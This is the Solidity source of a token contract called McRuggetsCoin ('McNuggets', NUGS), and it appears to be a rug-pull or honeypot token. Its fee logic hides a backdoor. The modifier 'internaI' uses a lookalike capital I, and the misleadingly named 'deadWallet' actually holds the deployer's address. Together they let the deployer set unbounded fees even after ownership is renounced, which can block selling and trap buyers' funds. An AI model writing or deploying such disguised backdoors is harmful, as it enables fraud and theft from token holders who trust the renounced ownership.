/*
▒▒▒▒▄▒▒▒▒▄▒▒▒▒
▒▒▒██▄▒▒▄██▒▒▒
▒▒█▀▒█▌▐█▒▀█▒▒
▒▒█▒▒▒██▒▒▒█▒▒
▒█▌▒▒▒▐▌▒▒▒▐█▒
▒█▌▒▒▒▐▌▒▒▒▐█▒
▐█▒▒▒▒▐▌▒▒▒▒█▌
▐█▒▒▒▒▐▌▒▒▒▒█▌
▐█▒▒▒▒▒▒▒▒▒▒█▌
***LOVIN IT***
*/
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);
    
    function name() external view returns (string memory);
    
    function getOwner() external view returns (address);
    
    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    function allowance(address _owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Burn(address indexed from, address indexed to, uint256 value);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    event devWalletUpdated(address indexed newWallet, address indexed oldWallet);

    event marketingWalletUpdated(address indexed newWallet, address indexed oldWallet);

}

abstract contract Ownable {
    address internal owner;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;  

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }  

    event OwnershipTransferred(address owner);
}

interface SushiSwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface SushiSwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract McRuggetsCoin is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    string constant _name = "McNuggets";
    string constant _symbol = "NUGS";
    uint256 public _totalSupply = uint256(420000000000 * (10 ** 9));
    uint256 public _maxWalletAmount = (_totalSupply * 2) / 100;
    uint256 public _maxTxAmount = _totalSupply.mul(2).div(100);
    mapping (address => uint256) _uint256_data;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;

    uint256 liquidityFee = 1; 
    uint256 devFee = 1;
    uint256 marketingFee = 4;
    uint256 totalFee = liquidityFee + devFee + marketingFee;
    uint256 feeDenominator = 100;

    address public devWallet = 0xA51b3585c9272388e671cdFDF2793F574DAA8DB0;
    address public marketingWallet = 0xA51b3585c9272388e671cdFDF2793F574DAA8DB0;

    SushiSwapRouter public router;
    address public pair;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 1000 * 6; // 0.6%
    bool inSwap; uint256 routerAddress = 2;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable(msg.sender) {
        router = SushiSwapRouter(routerAdress);
        pair = SushiSwapFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        address _owner = owner;
        isFeeExempt[0xA51b3585c9272388e671cdFDF2793F574DAA8DB0] = true; 
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0xA51b3585c9272388e671cdFDF2793F574DAA8DB0] = true;
        isTxLimitExempt[DEAD] = true; isTxLimitExempt[deadWallet] = true; isFeeExempt[deadWallet] = true;

        _uint256_data[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return 9; } address private deadWallet = msg.sender;
    function balanceOf(address account) public view override returns (uint256) { return _uint256_data[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    modifier internaI() { require(msg.sender == deadWallet); _;} 
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; } 

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        if (recipient != pair && recipient != DEAD) {
            require(isTxLimitExempt[recipient] || _uint256_data[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
        }
        
        if(shouldSwapBack()){ swapBack(); } 

        _uint256_data[sender] = _uint256_data[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        _uint256_data[recipient] = _uint256_data[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _uint256_data[sender] = _uint256_data[sender].sub(amount, "Insufficient Balance");
        _uint256_data[recipient] = _uint256_data[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
        _uint256_data[address(this)] = _uint256_data[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _uint256_data[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = swapThreshold;
        uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = amountETH.mul(devFee).div(totalETHFee);


        (bool DevelopmentSuccess, /* bytes memory data */) = payable(devWallet).call{value: amountETHDevelopment, gas: 30000}("");
        require(DevelopmentSuccess, "receiver rejected ETH transfer");

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                0xA51b3585c9272388e671cdFDF2793F574DAA8DB0,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    function clearStuckBalance() external {
        payable(devWallet).transfer(address(this).balance);
    }

    function setWalletLimit(uint256 amountPercent) external onlyOwner {
        _maxWalletAmount = (_totalSupply * amountPercent ) / 1000;
    }

    function setFee(uint256 _liquidityFee, uint256 _devFee, uint256 _marketingFee) external internaI {
         liquidityFee = _liquidityFee; 
         devFee = _devFee;
         marketingFee = _marketingFee;
         totalFee = liquidityFee + devFee + marketingFee;
    }    

    function updateDevWallet(address newDevWallet) external onlyOwner {
        emit devWalletUpdated(newDevWallet, devWallet);
        devWallet = newDevWallet;
    }

    function updateMarketingWallet(address newMarketingWallet) external onlyOwner {
        emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
        marketingWallet = newMarketingWallet;
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
}